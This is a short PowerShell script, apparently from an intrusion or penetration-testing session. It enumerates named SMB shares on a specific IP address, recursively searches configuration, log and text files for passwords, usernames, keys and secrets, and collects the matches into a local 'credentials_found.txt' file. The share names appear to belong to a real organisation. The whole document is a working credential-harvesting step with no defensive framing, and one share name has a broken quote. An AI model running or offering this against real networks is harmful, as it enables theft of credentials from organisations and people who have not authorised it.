$shares = "Adama", "Agan-Imprivata", "AGRIC", "allusr", "hilan", "Lab Results", NATIV P", "Oee_28", "ruslan.alanazarov", "vol", "w_Analytical Lab", "yosi temp", "מחלקת תפי אגן"  # Replace with actual share names from net view
foreach ($share in $shares) {
    Get-ChildItem "\\199.203.129.16\$share" -Recurse -Include *.txt,*.cfg,*.ini,*.json,*.log,*.xml 2>$null | 
    Select-String -Pattern "password|username|user|key|secret|credentials" | 
    Out-File -Append "C:\Temp\credentials_found.txt" -Encoding UTF8
}
